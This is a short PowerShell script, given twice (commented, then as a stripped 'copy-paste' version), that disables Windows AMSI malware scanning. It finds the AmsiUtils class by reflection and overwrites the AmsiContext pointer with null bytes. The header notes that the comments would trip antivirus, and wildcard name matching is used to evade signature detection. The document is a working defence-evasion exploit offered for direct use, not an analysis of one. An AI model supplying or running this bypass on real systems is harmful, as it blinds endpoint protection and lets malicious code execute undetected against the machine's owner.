# Powershell script to overwrite AmsiContext with null bytes to force AMSI to throw errors
# DO NOT COPY-PASTE HERE, THE COMMENTS WILL TRIGGER AV DUE TO AMSIUTILS BEING MENTIONED

# loop through all assembly types to get the AmsiUtils class
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}

# loop through all non-public, static attributes in the AmsiUtils class and grab AmsiContext
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}

# get address of AmsiContext, convert it to hex and overwrite it with 0
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)


### COPY-PASTE HERE

$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}

$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}

$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
